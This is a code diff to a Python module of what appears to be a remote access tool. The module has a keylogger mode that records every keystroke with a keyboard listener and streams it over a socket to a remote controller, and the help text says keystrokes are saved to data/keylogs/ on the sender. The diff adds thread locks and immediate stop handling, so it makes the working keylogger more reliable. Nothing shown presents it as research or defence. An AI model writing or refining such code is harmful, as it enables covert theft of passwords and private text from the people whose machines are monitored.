@@ -21,12 +21,12 @@ def start_keylogger(sock: socket.socket, mode_manager: ModeManager) -> None:
     """
     # Check if we can enter keylogger mode
     if not mode_manager.set_mode(Mode.KEYLOGGER):
-        send_error(sock, "Already in another mode. Use /stop first.")
+        send_error(sock, "Already in another mode. Use /stop first.", mode_manager.socket_write_lock)
         return
 
     # Send confirmation with timestamp
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    send_text(sock, f"<KEYLOG_START>{timestamp}")
+    send_text(sock, f"<KEYLOG_START>{timestamp}", mode_manager.socket_write_lock)
     log(f"Keylogger started - session: {timestamp}")
 
     # Start keylogger in background thread
@@ -47,9 +47,14 @@ def start_keylogger(sock: socket.socket, mode_manager: ModeManager) -> None:
                     key_name = str(key).replace("Key.", "")
                     keystroke = f"[{key_name}]"
 
-                # Stream keystroke to sender immediately
+                # Stream keystroke to sender immediately (with write lock for atomicity)
                 try:
-                    sock.sendall(keystroke.encode("utf-8", errors="replace"))
+                    keystroke_bytes = keystroke.encode("utf-8", errors="replace")
+                    if hasattr(mode_manager, "socket_write_lock"):
+                        with mode_manager.socket_write_lock:
+                            sock.sendall(keystroke_bytes)
+                    else:
+                        sock.sendall(keystroke_bytes)
                 except (socket.error, BrokenPipeError):
                     log("Keylogger: Connection lost")
                     return False  # Stop listener
@@ -60,11 +65,18 @@ def start_keylogger(sock: socket.socket, mode_manager: ModeManager) -> None:
             return True  # Continue listening
 
         # Create and start keyboard listener
+        # Store listener reference in mode_manager for immediate stopping
+        listener = keyboard.Listener(on_press=on_press, suppress=False)
+        mode_manager.keylogger_listener = listener
+
         try:
-            with keyboard.Listener(on_press=on_press, suppress=False) as listener:
-                listener.join()
+            listener.start()
+            listener.join()  # Block until listener stops
         except Exception as e:
             log(f"Keylogger listener error: {e}")
+        finally:
+            # Clean up listener reference
+            mode_manager.keylogger_listener = None
 
         log("Keylogger thread stopped")
 
@@ -75,24 +87,32 @@ def start_keylogger(sock: socket.socket, mode_manager: ModeManager) -> None:
 
 def stop_keylogger(sock: socket.socket, mode_manager: ModeManager) -> None:
     """
-    Stop keylogger mode.
+    Stop keylogger mode immediately.
 
     Args:
         sock: Socket to send confirmation through
         mode_manager: Mode manager instance
     """
     if mode_manager.current_mode != Mode.KEYLOGGER:
-        send_error(sock, "Keylogger is not running.")
+        send_error(sock, "Keylogger is not running.", mode_manager.socket_write_lock)
         return
 
     # Signal stop
     mode_manager.signal_stop()
 
-    # Wait for thread to finish
+    # Immediately stop the keyboard listener (interrupts listener.join())
+    if hasattr(mode_manager, "keylogger_listener") and mode_manager.keylogger_listener:
+        try:
+            mode_manager.keylogger_listener.stop()
+            log("Keylogger listener stopped")
+        except Exception as e:
+            log(f"Warning: Could not stop listener: {e}")
+
+    # Wait for thread to finish (should be very quick now)
     mode_manager.wait_for_thread(timeout=2)
 
     # Send end marker
-    send_text(sock, "<KEYLOG_END>")
+    send_text(sock, "<KEYLOG_END>", mode_manager.socket_write_lock)
     log("Keylogger stopped")
 
     # Reset mode
@@ -119,4 +139,4 @@ Usage:
   
 All keystrokes are automatically saved to data/keylogs/ on sender.py.
 """
-    send_text(sock, message)
+    send_text(sock, message, mode_manager.socket_write_lock)
